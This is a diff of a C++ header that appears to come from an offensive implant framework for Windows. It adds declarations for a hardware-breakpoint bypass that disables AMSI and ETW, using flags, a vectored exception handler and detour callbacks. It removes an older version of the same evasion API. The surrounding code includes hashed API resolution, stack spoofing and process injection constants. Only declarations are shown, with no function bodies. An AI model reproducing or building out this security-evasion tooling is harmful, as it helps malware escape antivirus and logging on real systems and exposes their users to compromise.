@@ -10,7 +10,14 @@ namespace mscorlib {
     #include <mscoree.hpp>    
 }
 
+auto hwbp_bypass( INT32 mode ) -> BOOL;
+auto hwbp_clean( VOID ) -> BOOL;
+
 #define Dbg1( x, ... ) self->ntdll.DbgPrint( x, ##__VA_ARGS__ )
+
+#define BYPASS_AMSI 0x1
+#define BYPASS_ETW  0x2
+#define BYPASS_ALL  0x3
 
 typedef _PropertyInfo IPropertyInfo;
 typedef _AppDomain    IAppDomain;
@@ -139,8 +146,8 @@ typedef _STACK_FRAME STACK_FRAME;
 #define KH_METHOD_INLINE 0x15
 #define KH_METHOD_FORK   0x20
 
-#define KH_INJECT_EXPLICIT 0x100
-#define KH_INJECT_SPAWN    0x200
+#define KH_INJECT_EXPLICIT 0x30
+#define KH_INJECT_SPAWN    0x50
 
 class mself {
 public:
@@ -160,6 +167,13 @@ public:
         HANDLE foward;
     } pipe;
     
+    struct {
+        BOOL     initialized;
+        PVOID    veh_handle;
+        UINT_PTR callbacks[4];
+        UINT_PTR targets[4];
+    } hwbp_data;
+
     struct {
         FRAME_INFO first;   // 0x00  // RtlUserThreadStart+0x21
         FRAME_INFO second;  // 0x10  // BaseThreadInitThunk+0x14
@@ -291,6 +305,8 @@ public:
 
         declapi( BaseThreadInitThunk );
 
+        declapi( GetCurrentThread );
+
         declapi( GetConsoleWindow );
         declapi( FreeConsole );
         declapi( AllocConsoleWithOptions );
@@ -319,6 +335,8 @@ public:
     } kernel32 = {
         rsl_hash( BaseThreadInitThunk ),
 
+        rsl_hash( GetCurrentThread ),
+
         rsl_hash( GetConsoleWindow ),
         rsl_hash( FreeConsole ),
         rsl_hash( AllocConsoleWithOptions ),
@@ -345,18 +363,6 @@ public:
         rsl_hash( SetEvent ),
         rsl_hash( CreateEventW ),
     };
-
-    struct {
-        PVOID Handler;
-        BOOL  Init;
-
-        PVOID NtTraceEvent;
-        PVOID AmsiScanBuffer;
-        PVOID ExitPtr;
-
-        UPTR Addresses[4];
-        UPTR Callbacks[4];
-    } Hwbp;
 };
 
 namespace spoof {
@@ -436,85 +442,6 @@ namespace parser {
     auto wstr(  _In_ PARSER* parser,  _Out_ ULONG* size = nullptr ) -> PWCHAR;
 
     auto destroy( _In_ PARSER* parser ) -> BOOL;
-}
-
-typedef struct _DESCRIPTOR_HOOK {
-    ULONG  ThreadID;
-    UPTR Handle;
-    BOOL   Processed;
-    INT8   Drx;
-    UPTR   Address;
-    VOID ( *Detour )( PCONTEXT );
-    struct _DESCRIPTOR_HOOK* Next;
-    struct _DESCRIPTOR_HOOK* Prev;
-} DESCRIPTOR_HOOK, *PDESCRIPTOR_HOOK;
-
-#define DOTNET_BYPASS_NONE 0x000
-#define DOTNET_BYPASS_EXIT 0x200
-#define DOTNET_BYPASS_ALL  0x100
-#define DOTNET_BYPASS_ETW  0x400
-#define DOTNET_BYPASS_AMSI 0x700
-
-enum Dr {
-    x0,
-    x1,
-    x2,
-    x3
-};
-
-namespace Hwbp {
-    auto SetDr7(
-        UPTR ActVal,
-        UPTR NewVal,
-        INT  StartPos,
-        INT  BitsCount
-    ) -> UPTR;
-
-    auto Install(
-        UPTR  Address,
-        INT8  Drx,
-        PVOID Callback
-    ) -> BOOL;
-
-    auto Uninstall(
-        UPTR  Address
-    ) -> BOOL;
-
-    auto SetBreak(
-        UPTR  Address,
-        INT8  Drx,
-        BOOL  Init
-    ) -> BOOL;
-
-    auto Insert(
-        UPTR  Address,
-        INT8  Drx,
-        BOOL  Init
-    ) -> BOOL;
-
-    auto Init( VOID ) -> BOOL;
-    auto Clean( VOID ) -> BOOL;
-    auto DotnetInit( INT32 BypassFlags ) -> BOOL;
-    auto DotnetExit( VOID ) -> BOOL;
-
-    auto SetArg(
-        PCONTEXT Ctx,
-        UPTR     Val,
-        ULONG    Idx
-    ) -> VOID;
-
-    auto GetArg(
-        PCONTEXT Ctx,
-        ULONG    Idx
-    ) -> UPTR;
-
-    auto HandleException(
-        EXCEPTION_POINTERS* e
-    ) -> LONG;
-
-    auto PatchExitDetour( PCONTEXT Ctx ) -> VOID;
-    auto EtwDetour( PCONTEXT Ctx ) -> VOID;
-    auto AmsiDetour( PCONTEXT Ctx ) -> VOID;
 }
 
 #endif // GENERAL_H
